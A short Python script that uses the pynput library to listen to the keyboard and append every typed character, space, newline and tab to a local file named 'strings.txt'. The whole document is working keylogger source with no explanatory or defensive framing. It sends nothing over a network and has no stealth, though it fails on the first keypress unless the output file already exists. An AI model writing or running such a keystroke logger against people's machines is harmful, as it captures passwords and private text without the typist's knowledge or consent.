from pathlib import Path

from pynput.keyboard import Key, Listener


OUTPUT_PATH = Path(__file__).with_name("strings.txt")


def on_press(key):
    text = None

    if hasattr(key, "char") and key.char is not None:
        text = key.char
    elif key == Key.space:
        text = " "
    elif key == Key.enter:
        text = "\n"
    elif key == Key.tab:
        text = "\t"

    if text is None:
        return

    OUTPUT_PATH.write_text(
        OUTPUT_PATH.read_text(encoding="utf-8") + text,
        encoding="utf-8",
    )


with Listener(on_press=on_press) as listener:
    listener.join()
